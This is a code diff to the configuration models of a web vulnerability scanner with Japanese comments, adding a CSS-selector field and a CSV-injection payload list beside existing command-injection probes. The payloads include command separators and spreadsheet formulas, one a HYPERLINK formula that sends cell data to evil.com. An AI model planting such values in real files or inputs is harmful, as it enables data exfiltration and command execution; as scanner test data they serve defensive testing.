@@ -23,6 +23,7 @@ class VulnerabilityFinding(BaseModel):
     remediation: Optional[str] = None   # 対策
     category: Optional[str] = None      # 分類（例: A, B, C...）
     test_type: Optional[str] = None     # 検査タイプ（能動的/受動的）
+    element_selector: Optional[str] = None # 脆弱性に関連する要素のCSSセレクタ
 
 
 class ScanResult(BaseModel):
@@ -86,3 +87,16 @@ class ScanOptions(BaseModel):
         payloads: List[str] = ["test;invalidcmd12345", "test|invalidcmd12345", "`invalidcmd12345`"]
         error_signatures: List[str] = ["sh:", "bash:", "not found", "syntax error", "unexpected token"]
     cmdi: "ScanOptions.CommandInjectionOptions" = CommandInjectionOptions()
+    class CSVI_Options(BaseModel):
+        enabled: bool = True
+        payloads: List[str] = [
+            "=2+3",
+            "@SUM(A1:A2)",
+            '=HYPERLINK("http://evil.com?data=" & A1, "Click me")',
+            ',=2+3',
+            ';=2+3',
+            '","=2+3',
+            '";=2+3',
+        ]
+    csvi: "ScanOptions.CSVI_Options" = CSVI_Options()
+    deep_scan: bool = False # For agent-based scanning
